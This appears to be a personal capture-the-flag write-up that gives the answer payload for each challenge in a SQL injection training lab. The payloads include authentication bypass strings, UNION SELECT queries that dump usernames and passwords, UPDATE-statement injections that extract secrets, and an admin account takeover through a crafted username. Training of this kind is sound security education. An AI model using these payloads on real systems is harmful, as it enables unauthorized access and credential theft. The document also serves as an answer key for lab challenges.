## Taks 1 
### SQL Injection 1: Input Box Non-String
* Answer : `1 or 1=1-- - `

### SQL Injection 2: Input Box String
* **Description** : *This challenge uses the same query as in the previous challenge. However, the parameter expects a string instead of an integer, as can be seen here:*
* Answer : `1' or '1'='1'-- -`
### SQL Injection 3 URL : 
* **Description** : *Here, the SQL query is the same as the previous one:* `SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='10' AND password='ce5ca67...'`
* Answer : `' or 1=1-- -`
### SQL injection ; 4 POST :
* **Description** : *When submitting the login form for this challenge, it uses the HTTP POST method. It is possible to either remove/disable the JavaScript validating the login form or submit a valid request and intercept it with a proxy tool such as Burp Suite and modify it:*
* Answer : `1' or 1=1--`
### SQL Injection 5: UPDATE Statement
* **Description** :* Log in to the "SQL Injection 5: UPDATE Statement" challenge and exploit the vulnerable profile page to find the flag. The credentials that can be used are:*
* profileID: `10`
* password:`toor`
* **FInd Database Version** : `',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='`
* **Final payload to find FLAG** : `',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email=''`
## Task 2: Track: Vulnerable Startup
## Broken Authentication
* **Description** : *The goal of this challenge is to find a way to bypass  the authentication to retrieve the flag.*
* **Pyload** : `' or 1=1-- -`
## Broken Authentication 2
* **Description** : *Find a way to abuse the login form to dump all the passwords in the database to retrieve the flag without using blind injection.*
* Python Script to decode session cookie: git clone https://github.com/noraj/flask-session-cookie-manager.git && cd flask-session-cookie-manager
* **Payload** : `' UNION SELECT 1,group_concat(password) FROM users-- -`
## Broken Authentication 3: Blind Injection
* **Description** : *This challenge has the same vulnerability as the previous one. However, it is no longer possible to extract data from the Flask session cookie or via the username display. The login form still has the same vulnerability, but this time the goal is to abuse the login form with blind SQL injection to extract the admin's password.*
* Payload : use sqlmap for this challeneg
## Vulnerable Notes
* **Description** : *Here, the previous vulnerabilities have been fixed, and the login form is no longer vulnerable to SQL injection. The team has added a new note function, allowing users to add notes on their page. The goal of this challenge is to find the vulnerability and dump the database to find the flag.*
* payload : '  `union select 1,group_concat(password) from users'`
## Change Password
* **Description** : *For this challenge, the vulnerability on the note page has been fixed. A new change password function has been added to the application, so the users can now change their password by navigating to the Profile page. The new function is vulnerable to SQL injection because the UPDATE statement concatenates the username directly into the SQL query, as can be seen below. The goal here is to exploit the vulnerable function to gain access to the admin's account.*
* Answer : Craete a user with this username admin'-- - then go to change password page chnage the password anything then login to admin account .
## Book Title 
* **Description** : *A new function has been added to the page, and it is now possible to search books in the database. The new search function is vulnerable to SQL injection because it concatenates the user input directly into the SQL statement. The goal of the task is to abuse this vulnerability to find the hidden flag.*
* Payload : ') union select 1,group_concat(username),group_concat(password),4 from users-- -') union select 1,group_concat(username),group_concat(password),4 from users-- -
